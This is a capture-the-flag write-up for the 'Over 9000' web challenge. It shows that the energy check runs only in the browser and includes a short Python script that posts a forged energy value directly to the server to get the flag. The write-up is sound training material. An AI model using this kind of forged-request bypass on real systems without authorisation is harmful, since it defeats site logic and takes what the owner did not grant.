---
title: "Over 9000 - Texas Security Awareness Week 2024"
category: "web"
type: "writeup"
tags: ["web", "post", "texas-security-awareness-week", "texas-security-awareness-week-2024", "2024", "ctf-writeup"]
summary: "Help Goku get over 9000 energy to defeat his enemy Vegeta and save the world."
source:
  name: "CTFtime writeup #38961"
  url: "https://ctftime.org/writeup/38961"
original_source: "https://nightxade.github.io/ctf-writeups/writeups/2024/Texsaw-CTF-2024/web/over-9000.html"
ctf:
  name: "Texas Security Awareness Week 2024"
  year: 2024
  challenge: "Over 9000"
---

## Metadata

- **CTF:** Texas Security Awareness Week 2024
- **Task:** Over 9000
- **Author team:** reCAPTCHA the Flag
- **CTFtime tags:** web, post
- **CTFtime:** <https://ctftime.org/writeup/38961>
- **Original writeup:** <https://nightxade.github.io/ctf-writeups/writeups/2024/Texsaw-CTF-2024/web/over-9000.html>

---
Help Goku get over 9000 energy to defeat his enemy Vegeta and save the world. 

3.23.56.243:9005 

\---

Visit the site. Head to Chrome Dev Tools --> Sources. Here's the .js file controlling it all: 

```js

let currentEnergy = 0;

function gatheringEnergy(){  
currentEnergy++;  
$("#energycount").html(`${currentEnergy}`);  
if(currentEnergy == 10)  
{  
alert("out of energy try again :(")  
currentEnergy = 0;  
$("#energycount").html(0);  
  
}  
else if (currentEnergy > 9000)  
{  
  
$.ajax({  
type:"POST",  
url:"kamehameha.php",  
data:{energy: currentEnergy},  
success: function(flag){  
alert(`${flag}`);  
},  
error: function(responseText,status, error){  
console.log(`Tell the infrastructure team to fix this: Status = ${status} ; Error = ${error}`);  
}

})  
  
}  
}

```

So it's impossible to actually get to over 9000. However, we can just send a POST request ourselves to kamehameha.php! Here's a script that does just that: 

```py  
from requests import post

d = dict()  
d["energy"] = 9001  
res = post("http://3.23.56.243:9005/kamehameha.php", d).text  
print(res)  
```

And we get the flag! 

texsaw{y0u_th0ught_th1s_w4s_4_fl4g_but_1t_w4s_m3_d10}
